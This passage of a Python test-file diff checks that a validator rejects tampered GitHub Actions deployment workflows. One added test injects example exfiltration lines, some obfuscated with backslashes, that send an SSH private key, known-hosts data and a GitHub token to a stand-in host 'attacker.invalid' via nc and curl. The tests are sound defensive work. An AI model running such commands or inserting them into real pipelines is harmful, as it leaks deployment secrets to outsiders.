         with tempfile.TemporaryDirectory() as directory:
             root = self.copy_repository(directory)
             self.mutate_workflow(root, "permissions: {}", "permissions:\n      contents: write")
             with self.assertRaisesRegex(MODULE.PolicyError, "permissions"):
-                MODULE.validate_self_check(root)
+                MODULE.validate_workflow_semantics(root)
 
     def test_deploy_authenticity_gate_cannot_be_commented_out(self) -> None:
         with tempfile.TemporaryDirectory() as directory:
@@ -1076,8 +2355,89 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
                 "          # --policy release-control-policy.json \\\n"
                 "          # --cosign cosign",
             )
-            with self.assertRaisesRegex(MODULE.PolicyError, "actively verify"):
-                MODULE.validate_self_check(root)
+            with self.assertRaisesRegex(
+                MODULE.PolicyError, "actively verify|finite command allowlist"
+            ):
+                MODULE.validate_workflow_semantics(root)
+
+    def test_current_workflow_shell_blocks_match_finite_allowlist(self) -> None:
+        deploy = (
+            SOURCE_ROOT / ".github" / "workflows" / "deploy-approved-release.yml"
+        ).read_text(encoding="utf-8")
+        self.assertEqual(
+            MODULE.expected_deployment_shell_blocks(),
+            MODULE.active_shell_blocks(deploy),
+        )
+        self.assertEqual(
+            MODULE.expected_deployment_executable_steps(),
+            MODULE.executable_step_inventory(
+                deploy, "deploy-approved-release.yml"
+            ),
+        )
+        MODULE.validate_workflows(SOURCE_ROOT)
+
+    def test_deployment_workflow_rejects_inline_run_and_shell_inventory_drift(self) -> None:
+        mutations = (
+            (
+                "      - name: Deploy approved staging candidate",
+                "      - name: Unexpected inline command\n"
+                "        shell: bash\n"
+                "        run: true\n\n"
+                "      - name: Deploy approved staging candidate",
+            ),
+            (
+                "      - name: Deploy approved staging candidate",
+                "      - name: Unexpected block command\n"
+                "        shell: bash\n"
+                "        run: |\n"
+                "          true\n\n"
+                "      - name: Deploy approved staging candidate",
+            ),
+            ("        shell: bash", "        shell: zsh"),
+            ("        shell: bash\n", ""),
+            ("        shell: bash", "        shell: bash\n        shell: bash"),
+            ("        shell: bash", "        shell: bash -e {0}"),
+        )
+        for old, new in mutations:
+            with self.subTest(new=new), tempfile.TemporaryDirectory() as directory:
+                root = self.copy_repository(directory)
+                self.mutate_workflow(root, old, new)
+                with self.assertRaisesRegex(MODULE.PolicyError, "executable|shell"):
+                    MODULE.validate_workflow_semantics(root)
+
+    def test_deployment_shell_blocks_reject_appended_commands_and_exfiltration(self) -> None:
+        mutations = (
+            (
+                '          echo "Staging deployment completed"',
+                '          echo "Staging deployment completed"\n'
+                '          printf \'%s\' "$DEPLOY_SSH_PRIVATE_KEY" | nc attacker.invalid 4444',
+            ),
+            (
+                '          echo "Production deployment completed"',
+                '          echo "Production deployment completed"; nc attacker.invalid 4444 '
+                '<<<"$DEPLOY_KNOWN_HOSTS"',
+            ),
+            (
+                "            --cosign cosign",
+                "            --cosign cosign\n"
+                '          command p\\rintf \'%s\' "$GH_TOKEN" | n\\c attacker.invalid 4444',
+            ),
+            (
+                '          grep -qx \'RELEASE_DEPLOYMENT_SUCCEEDED\' "$stdout"',
+                '          grep -qx \'RELEASE_DEPLOYMENT_SUCCEEDED\' "$stdout"\n'
+                '          c\\url -X POST --data-binary @"$key" https://attacker.invalid',
+            ),
+            (
+                '          rm -f -- "$report"',
+                '          rm -f -- "$report"\n          true',
+            ),
+        )
+        for old, new in mutations:
+            with self.subTest(new=new), tempfile.TemporaryDirectory() as directory:
+                root = self.copy_repository(directory)
+                self.mutate_workflow(root, old, new)
+                with self.assertRaisesRegex(MODULE.PolicyError, "finite command allowlist"):
+                    MODULE.validate_workflow_semantics(root)
 
     def test_deploy_manifest_report_authenticity_mismatch_controls_cannot_be_reused(self) -> None:
         mutations = (
@@ -1100,9 +2460,9 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
                 self.mutate_workflow(root, old, new)
                 with self.assertRaisesRegex(
                     MODULE.PolicyError,
-                    "authenticity request|authenticity bindings|byte digest",
+                    "authenticity request|authenticity bindings|byte digest|finite command allowlist",
                 ):
-                    MODULE.validate_self_check(root)
+                    MODULE.validate_workflow_semantics(root)
 
     def test_manifest_is_rejected_before_bootstrap(self) -> None:
         with tempfile.TemporaryDirectory() as directory:
@@ -1122,8 +2482,7 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
             policy["authenticity"] = {
                 "signingConfigured": True,
                 "expectedCertificateIdentity": (
-                    "https://github.com/example/release-control/.github/workflows/"
-                    "sign-authenticity-request.yml@refs/heads/main"
+                    MODULE.verify_authenticity.EXPECTED_CERTIFICATE_IDENTITY
                 ),
                 "certificateOidcIssuer": MODULE.verify_authenticity.EXPECTED_ISSUER,
             }
@@ -1131,21 +2490,21 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
             with self.assertRaisesRegex(MODULE.PolicyError, "requires a committed"):
                 MODULE.validate_self_check(root)
 
-    def test_configured_signing_before_bootstrap_allows_missing_bundle(self) -> None:
+    def test_foreign_repository_identity_fails_end_to_end(self) -> None:
         with tempfile.TemporaryDirectory() as directory:
             root = self.copy_repository(directory)
             policy_path = root / "release-control-policy.json"
             policy = json.loads(policy_path.read_text(encoding="utf-8"))
-            policy["authenticity"] = {
-                "signingConfigured": True,
-                "expectedCertificateIdentity": (
-                    "https://github.com/example/release-control/.github/workflows/"
-                    "sign-authenticity-request.yml@refs/heads/main"
-                ),
-                "certificateOidcIssuer": MODULE.verify_authenticity.EXPECTED_ISSUER,
-            }
+            policy["authenticity"]["signingConfigured"] = True
+            policy["authenticity"]["expectedCertificateIdentity"] = (
+                "https://github.com/foreign-owner/link-cdss-release-control/.github/"
+                "workflows/sign-authenticity-request.yml@refs/heads/main"
+            )
             policy_path.write_text(json.dumps(policy), encoding="utf-8")
-            MODULE.validate_self_check(root)
+            with self.assertRaisesRegex(
+                MODULE.PolicyError, "configured public repository workflow"
+            ):
+                MODULE.validate_self_check(root)
 
     def test_configured_repository_validates_every_manifest(self) -> None:
         with tempfile.TemporaryDirectory() as directory:
@@ -1158,8 +2517,7 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
                 "authenticity": {
                     "signingConfigured": True,
                     "expectedCertificateIdentity": (
-                        "https://github.com/example/release-control/.github/workflows/"
-                        "sign-authenticity-request.yml@refs/heads/main"
+                        MODULE.verify_authenticity.EXPECTED_CERTIFICATE_IDENTITY
                     ),
                     "certificateOidcIssuer": "https://token.actions.githubusercontent.com",
                 },
